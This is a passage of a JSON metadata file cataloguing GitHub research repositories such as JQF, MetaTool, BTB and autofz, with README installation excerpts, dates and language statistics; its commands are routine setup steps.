                    "value": "[ISSTA'19 paper]: https://rohan.padhye.org/files/zest-issta19.pdf\n[ISSTA'18 paper]: https://rohan.padhye.org/files/perffuzz-issta18.pdf\n[ISSTA'19 tool paper]: https://rohan.padhye.org/files/jqf-issta19.pdf\n[ICSE'20 paper]: https://rohan.padhye.org/files/rlcheck-icse20.pdf\n[ASE'20 paper]: https://rohan.padhye.org/files/bigfuzz-ase20.pdf\n[ICSE'21 paper]: https://rohan.padhye.org/files/bonsai-icse21.pdf\n[ISSTA'23 paper]: https://dx.doi.org/10.1145/3597926.3598107 \n",
                    "original_header": "JQF + Zest: Semantic Fuzzing for Java"
                },
                "confidence": 0.9976759590572669,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rohanpadhye/jqf/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you find bugs with JQF and you comfortable with sharing, We would be happy to add them to this list. \nPlease send a PR for README.md with a link to the bug/cve you found. \n",
                    "original_header": "Trophies"
                },
                "confidence": 0.9990529939578269,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rohanpadhye/jqf/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-02-23T01:27:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T18:45:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 702515
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 32312
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 9067
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 8147
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 133
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "243": {
        "filename": "collab-uniba_personality_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/collab-uniba/personality",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The dump can be imported into a pre-existing db named `apache` as follows:\n```bash\n$ mysql -u <username> -p<PlainPassword> apache < apachebig5.sql\n```\n \n",
                    "original_header": "0. Dataset"
                },
                "confidence": 0.9982325681533115,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/collab-uniba/personality/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\n$ git clone https://github.com/collab-uniba/personality.git --recursive\n``` \n",
                    "original_header": "1. Cloning"
                },
                "confidence": 0.9999999961014012,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/collab-uniba/personality/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-12-19T18:00:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-21T15:18:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 191956
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1114
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "244": {
        "filename": "HowieHwong_MetaTool_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/HowieHwong/MetaTool",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```shell\npip install --upgrade pip\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install the packages:",
                    "parent_header": [
                        "MetaTool Benchmark: Deciding Whether to Use Tools and Which to Use",
                        "Quick Start"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/HowieHwong/MetaTool/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-07T06:42:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T13:32:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 32438
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1479
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "245": {
        "filename": "autonomy-and-verification_varanus_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/autonomy-and-verification/varanus",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Using the instructions from: https://www.linuxuprising.com/2018/05/fix-libpng12-0-missing-in-ubuntu-1804.html\n\nThe instructions below work for **Ubuntu 22.10, 22.04, 21.10 or 20.04** (for 18.04, check https://www.linuxuprising.com/2018/05/fix-libpng12-0-missing-in-ubuntu-1804.html )\n\n```\nsudo add-apt-repository ppa:linuxuprising/libpng12\nsudo apt update\nsudo apt install libpng12-0\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Cannot Install FDR: Depends: libpng12-0 but it is not installable",
                    "parent_header": [
                        "Varanus 0.9.4"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/autonomy-and-verification/varanus/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you have problems installing or running **FDR4** please check the [FDR Troubleshooting](docs/fdr-troubleshooting.md) document.\n \n",
                    "original_header": "Troubleshooting"
                },
                "confidence": 0.9939232832677886,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/autonomy-and-verification/varanus/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Here, the workaround uses the Python 2.7 version of this library, aliasing it to the Python 2.6 version. \nMake sure that you have `libpython2.7.so.1.0` installed (it should be at `/usr/lib/x86_64-linux-gnu/libpython2.7.so.1.0`). If you do not, then you should be able to install it using:\n```bash\nsudo apt install python2.7-dev\n```\nWhen you are sure the library is installed, run the following:\n```bash\nsudo ln -s /usr/lib/x86_64-linux-gnu/libpython2.7.so.1.0 \\\n/usr/lib/x86_64-linux-gnu/libpython2.6.so.1.0\n\n```\nwhich is modified from [Stack Exchange](https://askubuntu.com/questions/427884/libpython2-6-so-1-0-doesnt-exist), which adds a link from the missing `libpython2.6.so.1.0` to the existing `libpython2.7.so.1.0` file.\n \n",
                    "original_header": "ImportError: libpython2.6.so.1.0: cannot open shared object file: No such file or directory"
                },
                "confidence": 0.9940852796880861,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/autonomy-and-verification/varanus/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-09-03T15:49:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-21T16:49:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1658334
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "246": {
        "filename": "dependable-ai_nn-dependability-kit_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dependable-ai/nn-dependability-kit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "See [nn_dependability_kit_manual.pdf](https://github.com/dependable-ai/nn-dependability-kit/blob/master/nn_dependability_kit_manual.pdf)\n",
                    "type": "Text_excerpt",
                    "original_header": "Manual",
                    "parent_header": [
                        "nn-dependability-kit"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dependable-ai/nn-dependability-kit/master/README.md"
            },
            {
                "result": {
                    "value": "- [Metrics] saliency (https://github.com/PAIR-code/saliency)\n  Use it in the following way:\n```\n# init submodule for saliency\ncd nndependability/metrics/saliency-source/\ngit submodule init\ngit submodule update\ncd ..\nln -s saliency-source/saliency saliency\ncd ../../\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "1. Additional package to be installed",
                    "parent_header": [
                        "nn-dependability-kit",
                        "Other topics",
                        "A. Metrics related to intrepretation precision and occlusion sensitivity"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dependable-ai/nn-dependability-kit/master/README.md"
            },
            {
                "result": {
                    "value": "```\ncd models/SSD-Tensorflow/\ngit submodule init\ngit submodule update\n\n# prepare weights\ncd checkpoints/\nunzip ssd_300_vgg.ckpt.zip\ncd ../\n\n# install custom changes to module SSD-Tensorflow that allows using saliency\ngit apply ../ssd_tensorflow_diff.diff\ncd ../../\n```",
                    "type": "Text_excerpt",
                    "original_header": "2. Preparation for SSD example",
                    "parent_header": [
                        "nn-dependability-kit",
                        "Other topics",
                        "A. Metrics related to intrepretation precision and occlusion sensitivity"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dependable-ai/nn-dependability-kit/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-07-03T09:04:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-09T07:46:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 2498065
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 159315
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 27960
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "247": {
        "filename": "ltorgo_performanceEstimation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ltorgo/performanceEstimation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**To Install the Latest Oficial Release (from CRAN) do the following in R:** \n    install.packages(\"performanceEstimation\") \n**To Install the Latest Development Release (from github) do the following in R:** \n    library(devtools)  # You need to install this package!\n    install_github(\"ltorgo/performanceEstimation\",ref=\"develop\") \nIf this previous install_github call somehow fails (there are reports of problems with different libcurl library version on Linux hosts) you may try in alternative the following in R: \n    library(devtools)\n    install_git(\"https://github.com/ltorgo/peformanceEstimation\",branch=\"develop\") \n\nAfter installation using any of the above procedures, the package can be used as any other R package by doing: \n",
                    "original_header": "performanceEstimation"
                },
                "confidence": 0.9829378737060613,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ltorgo/performanceEstimation/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2013-11-27T17:54:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-28T15:30:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 678002
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 221467
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 155694
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Emacs Lisp",
                    "name": "Emacs Lisp",
                    "type": "Programming_language",
                    "size": 3100
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2520
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "248": {
        "filename": "zfj1998_M3NSCT5_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zfj1998/M3NSCT5",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Before you run the code, make sure you have prepared the necessary environment:\n```\nconda create -n m3nsct5 python=3.7\nconda activate m3nsct5\npip install -r requirements.txt\n```\n \n",
                    "original_header": "Environment"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zfj1998/M3NSCT5/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-29T02:16:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-26T11:12:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 55470
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1829
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "249": {
        "filename": "wssun_EACS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wssun/EACS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The CodeSearchNet original dataset can be downloaded from the github repo: [https://github.com/github/CodeSearchNet](https://github.com/github/CodeSearchNet), and the cleaned dataset (CodeXGLUE) can be downloaded from the [https://drive.google.com/open?id=1rd2Tc6oUWBo7JouwexW3ksQ0PaOhUr6h](https://drive.google.com/open?id=1rd2Tc6oUWBo7JouwexW3ksQ0PaOhUr6h) \nThe JCSD and PCSD dataset can be downloaded from the github repo: [https://github.com/xing-hu/TL-CodeSum](https://github.com/xing-hu/TL-CodeSum) and [https://github.com/wanyao1992/code_summarization_public](https://github.com/wanyao1992/code_summarization_public)\n \n",
                    "original_header": "Original Dataset"
                },
                "confidence": 0.9938551111615648,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/wssun/EACS/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-18T02:30:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-13T03:37:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 246177
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "250": {
        "filename": "joymallyac_Fair-Knn_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/joymallyac/Fair-Knn",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-07-04T06:54:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-02T17:01:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 6558
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "251": {
        "filename": "HDI-Project_BTB_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MLBazaar/BTB",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The easiest and recommended way to install **BTB** is using [pip](\nhttps://pip.pypa.io/en/stable/):\n\n```bash\npip install baytune\n```\n\nThis will pull and install the latest stable release from [PyPi](https://pypi.org/).\n\nIf you want to install from source or contribute to the project please read the\n[Contributing Guide](https://mlbazaar.github.io/BTB/contributing.html#get-started).\n",
                    "type": "Text_excerpt",
                    "original_header": "Install with pip",
                    "parent_header": [
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/HDI-Project/BTB/main/README.md"
            },
            {
                "result": {
                    "value": "The first step in order to use the `BTBSession` class is to develop a `scoring` function.\n\nThis is a Python function that, given a model name and a `hyperparameter` configuration,\nevaluates the performance of the model on your data and returns a score.\n\n```python3\nfrom sklearn.datasets import load_wine\nfrom sklearn.linear_model import SGDClassifier\nfrom sklearn.metrics import f1_score, make_scorer\nfrom sklearn.model_selection import cross_val_score\nfrom sklearn.tree import DecisionTreeClassifier\n\n\ndataset = load_wine()\nmodels = {\n    'DTC': DecisionTreeClassifier,\n    'SGDC': SGDClassifier,\n}\n\ndef scoring_function(model_name, hyperparameter_values):\n    model_class = models[model_name]\n    model_instance = model_class(**hyperparameter_values)\n    scores = cross_val_score(\n        estimator=model_instance,\n        X=dataset.data,\n        y=dataset.target,\n        scoring=make_scorer(f1_score, average='macro')\n    )\n    return scores.mean()\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Prepare a scoring function",
                    "parent_header": [
                        "Quickstart"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/HDI-Project/BTB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you want to quickly discover **BTB**, simply click the button below and follow the tutorials! \n",
                    "original_header": "Try it out now!"
                },
                "confidence": 0.9999079529512398,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HDI-Project/BTB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Detailed results from which this summary emerged are available [here](https://docs.google.com/spreadsheets/d/15a-pAV_t7CCDvqDyloYmdVNFhiKJFOJ7bbgpmYIpyTs/edit?usp=sharing).\n- If you want to compare your own tuner, follow the steps in our benchmarking framework [here](https://github.com/MLBazaar/BTB/tree/master/benchmark).\n- If you have a proposal for tuner that we should include in our benchmarking get in touch\nwith us at [dailabmit@gmail.com](mailto:dailabmit@gmail.com).\n \n",
                    "original_header": "Number of Wins on latest Version"
                },
                "confidence": 0.9695879450749633,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HDI-Project/BTB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n* License: \n* Development Status: \n* Documentation: https://mlbazaar.github.io/BTB\n* Homepage: https://github.com/MLBazaar/BTB \n"
                },
                "confidence": 0.9999964157830163,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HDI-Project/BTB/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-11-03T00:18:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-12T17:10:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 314452
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 79741
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1596
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 552
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "252": {
        "filename": "sslab-gatech_autofz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sslab-gatech/autofz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "- `docker`\n- `docker-compose`\n\n\n\n\n\n\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "required system packages",
                    "parent_header": [
                        "autofz",
                        "Installing (Skipped if you are using the provided VM)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "value": "```sh\ndocker pull fuyu0425/autofz:v1.0.1\ndocker tag fuyu0425/autofz:v1.0.1 autofz\n```\nPlease check https://hub.docker.com/repository/docker/fuyu0425/autofz/tags for possible tags. Default is `latest`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Pull docker image",
                    "parent_header": [
                        "autofz",
                        "Installing (Skipped if you are using the provided VM)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "value": "1. Download the VirtualBox and install the Oracle Extension Pack\n2. Download and import the OVA files\n   - [OVA URL](https://doi.org/10.5281/zenodo.7865366)\n3. Start the VM, the credential is `autofz:autofz`\n   - SSH is installed, and you need to configure VirtualBox network first to ssh into the VM. Port forwarding would be the easiest way.\n4. All the data will in the home directory\n",
                    "type": "Text_excerpt",
                    "original_header": "VM Setup",
                    "parent_header": [
                        "autofz"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "value": "- CPU: 2 (more if you want to use multi-core implementation)\n- RAM: 8GM (really depends on the chosen fuzzers and target you want to fuzz, autofz itself takes few memory.)\n",
                    "type": "Text_excerpt",
                    "original_header": "Resource",
                    "parent_header": [
                        "autofz",
                        "VM Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To inspect the log file (e.g. `exiv2.json`), we recommend using a tool called\n[jq](https://github.com/stedolan/jq), which can be installed by the\npackage manager in most Linux distributions. We already installed it in both the\ndocker image and the VM image. \nOne of them is `log`, which can be retrieved by the following command.\n```sh\njq .log exiv2.json\n```\n \nTo get the results based on rounds, we can use the following commands.\n```sh\njq .round exiv2.json\n```\n \nIn the provided VM, we provided one of the fuzzing log with the path \n",
                    "original_header": "Inspect log files of autofz"
                },
                "confidence": 0.97834623482834,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Example\n```\nautofz.sh run --rm -v `pwd`:/work/autofz -w /work/autofz autofz -o output -t exiv2 -f all -T 24h\n``` \n",
                    "original_header": "Fuzzing using docker image on the host"
                },
                "confidence": 0.9839886838231114,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First build baseline fuzzers and benchmarks.\n```\n./docker/build.sh\n```\nThen, build the all-in-one docker including `autofz` and all the fuzzers/benchmarks.\n```\n./build.sh\n```\n \nYou can tune the image name/tag in these `build.sh`. \nYou might need to tune `_UID` and `GID` (they are hard-coded to `2000` when building the pre-built image) in `build.sh` to bypass docker volume permission issue if you don't want to use root user. \n",
                    "original_header": "Build docker image"
                },
                "confidence": 0.9973903280236304,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The build script parallels the compilation process a lot by making the jobs runs in the background (by inserting `&` at the end of shell commands). It will takes a lot of CPU and RAM (especially during linking). Please remove `&` in build scripts (`build.sh` or `build_all.sh` under `docker/benchmark`) when you are building under less performant machines.\n \n",
                    "original_header": "Build Note/Warning"
                },
                "confidence": 0.9556435731247086,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- build the fuzzer\n- add it to `config.py` under `Config['fuzzer']`\n \n",
                    "original_header": "How to add a baseline fuzzer"
                },
                "confidence": 0.9971336257974444,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- implement fuzzer API/driver under `autofz/fuzzer_driver` directories.\n  - Only Start/Pause/Resume/Stop APIs are needed in single-core (default) mode.\n  - Please take a look at `autofz/fuzzer_driver/afl.py` as a reference.\n  - You might need to add some code in`autofz/fuzzer_driver/db.py` and `autofz/fuzzer_driver/main.py` too.\n- add fuzzer to `autofz/mytypy.py`.\n- add fuzzer to `autofz/watcher.py`.\n \n",
                    "original_header": "Add the necessary group code in autofz"
                },
                "confidence": 0.9736312479376579,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "After modifying `config.py`, you need to do `pip install` again. \n",
                    "original_header": "Reinstall after changing `config.py`"
                },
                "confidence": 0.9999984943399449,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sslab-gatech/autofz/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-22T19:41:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-20T07:29:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 22952820
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PHP",
                    "name": "PHP",
                    "type": "Programming_language",
                    "size": 889553
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 385771
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 355693
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 107338
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 52275
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 50724
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 26691
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 26426
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 19970
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 3975
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 1654
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "GDB",
                    "name": "GDB",
                    "type": "Programming_language",
                    "size": 1320
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PLpgSQL",
                    "name": "PLpgSQL",
                    "type": "Programming_language",
                    "size": 172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
